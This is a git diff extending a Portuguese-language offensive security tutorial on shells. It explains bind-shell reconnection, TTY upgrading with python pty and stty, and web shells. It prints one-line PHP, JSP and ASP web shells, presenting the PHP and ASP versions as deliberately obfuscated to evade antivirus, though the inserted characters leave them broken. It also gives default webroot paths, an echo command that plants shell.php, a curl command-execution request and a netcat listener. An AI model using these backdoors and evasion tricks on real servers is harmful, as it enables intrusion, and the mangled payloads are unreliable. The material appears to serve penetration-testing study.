@@ -77,8 +77,28 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+Com isso você é diretamente colocado na sessão e pode interagir com o sistema, ao contrário do reverse, no bind shell, caso você se desconecte pode reconectar rápidamente, mas se o host remoto for reiniciado ou a conexão caia, você pode ficar de luto pelo shell
 
+
+### TTY
+
+Depois de conectar a um shell, você só consegue digitar comandos, mas não pode editar eles com as setas do teclado nem acessar o histórico de comandos com as setas de cima e baixo, pra isso, você pode atualizar seu TTY (Isso evolui tanto que nem ele sabe o que a própria sigla significa)
+
+Tem várias formas de melhorar o TTY, você pode usar um método python em sistemas unix. você pode usar esse comando pra melhorar seu TTY:
+
+`Klython@root[/~]$ python -c 'import pty; pty.spawn("/bin/bash")'`
+
+Depois disso você pressiona ctrl+z pra colocar a conexão netcat em segundo plano, e usa o comando TTY
+
+```
+Klython@htb[/htb]$ stty raw -echo
+Klyton@htb[/htb]$ fg
+```
+
+o comando fg trás o shell de volta ao primeiro plano e pronto, e o shell TTY começa a funcionar
 ## Web shell
+
+O último tipo de shell é o web, é um script web (PHP ou ASPX) que aceita comandos em parâmetros de solicitação HTTP
 ### Upload de arquivos
 Uploads de arquivos são comuns na internet, mas as vezes são implementados de maneira insegura (ou só preguiçosa), oferecendo um caminho aberto para execução remota de código (RCE), é como se você olhasse pro hacker e falasse "Oi, pode entrar". Um upload de arquivo sem tratamento permite injeção de scripts que se conectam de volta à máquina atacante
 
@@ -89,8 +109,55 @@ Quando você adiciona sistemas de upload, é recomendado que os arquivos sejam e
 
 Caso você encontre um site com upload de arquivos, possívelmente ele é vulnerável a algum tipo de reverse-shell, o uso de um reverse shell é uma técnica comum. Um script de shell reverso PHP conecta o servidor à máquina do atacante.
 
-#### Listener de Reverse Shell
+### Criação de um web shell
+
+Essa é uma alternativa caso você não tenha opção de upar uma "imagem" com web-shell
+Um web shell é um script one-liner e pode ser memorizado fácil
+
+PHP: 
+`<?ph//p sy!stem($_RE+QUEST["c!m$d"]\); ?>`
+
+**obs: as "/", "!", "+" foram usadas para burlar antivirus que poderiam detectar esse script como um backdoor**
+
+JSP:
+`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
+
+ASP:
+
+`<% ev_!al r>eque_st("c-m-d") %>`
+
+**obs: os caracteres "_", "!", ">", "-" foram usadas para burlar antivirus que poderiam detectar esse script como um backdoor**
+
+Você pode gravar esse script diretamente no webroot do servidor, os caminhos de webroot padrão de cada servidor são
+
+| Servidor Web | Diretório Padrão                  |
+|--------------|-----------------------------------|
+| Apache       | `/var/www/html/`                  |
+| Nginx        | `/usr/local/nginx/html/`          |
+| IIS          | `C:\inetpub\wwwroot\`             |
+| XAMPP        | `C:\xampp\htdocs\`                |
+
+Você pode verificar cada diretório e usar o comando echo para escrever nele
+
+`echo '<?p!h$p sys%tem($_REQ+UEST["c!m#d"]); ?>' > /var/www/html/shell.php`
+
+**Nota: Isso é supondo que você já tem execução de código remoto com o servidor**
+
+Depois de escrever ele, você precisa executar o shell, você pode acessar o diretório dele na web ou usar o comando curl
+
+```
+curl http://site.com/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Depois de tanto shell, você deve ter entendido que esse trecho `uid=33(www-data) gid=33(www-data) groups=33(www-data)` indica a conexão, se não volta tudo até entender
+
+Um benefício de web shell é que ele simplesmente ignora qualquer firewall, já que não abriria uma porta mas executaria diretamente na porta que o servidor esteja rodando, outro benefício é que ele funcionaria mesmo que o host fosse reiniciado, mas nem tudo são flores, nem todo alvo tem um servidor apache rodando, o que torna esse shell inútil em algumas situações, outra desvantagem é que perto dos outros 2 esse shell não é nenhum pouco interativo, já que você precisa solicitar uma url diferente para executar comandos
+
+#### Listener de web Shell
 Um listener de reverse shell abre uma porta na rede para receber a conexão. O netcat faz isso com um comando:
 
 `sudo nc -lvnp 3333`
 Esse comando cria um listener na porta 3333. Em ambientes reais, é recomendável usar uma porta que não seja filtrada por firewalls
+
